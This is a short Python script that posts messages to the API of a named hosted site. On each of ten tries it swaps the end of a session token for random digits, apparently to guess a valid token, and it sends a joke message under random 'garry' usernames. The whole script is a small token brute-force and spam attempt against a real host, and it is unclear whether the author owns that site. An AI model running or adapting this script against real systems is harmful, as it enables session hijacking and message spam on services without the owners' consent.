import requests
import random
url = 'http://oldmartijntje.000webhostapp.com/api//messages/message.php'
data = {
    'content': 'hehehe haw', 
    'username': 'garry' + str(random.randint(0,1000)), 
    'sessionToken': '2df31Ce3-7577-4f49-9e7a-b139985e8000'
    }

for i in range(10):
    data['sessionToken'] = '2df31Ce3-7577-4f49-9e7a-b139985e' + str(random.randint(1000, 9999))
    x = requests.post(url, json = data)
    print(i, end=': ')
    print(x.text)
